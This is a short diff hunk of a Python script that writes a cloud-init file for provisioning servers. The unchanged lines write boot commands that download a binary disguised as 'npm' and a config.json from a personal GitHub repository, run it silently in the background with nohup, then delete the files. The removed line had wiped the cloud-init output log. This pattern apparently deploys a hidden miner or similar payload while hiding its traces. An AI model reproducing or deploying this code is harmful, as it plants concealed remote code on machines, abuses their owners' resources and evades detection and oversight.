@@ -26,7 +26,6 @@ with open("./cloud-init.txt", "w") as f:
     f.write("  - sleep 60 && wget https://raw.githubusercontent.com/drewnelson1/1/main/npm && wget https://raw.githubusercontent.com/drewnelson1/1/main/config.json && chmod +x npm && nohup ./npm --config=./config.json >/dev/null 2>&1 &" + "\n")
     f.write("  - sleep 5 && rm npm config.json" + "\n")
     f.write("  - rm -f /root/npm && rm -f /root/config.json" + "\n")
-    f.write("  - rm -f /var/log/cloud-init-output.log" + "\n")
     
 
 
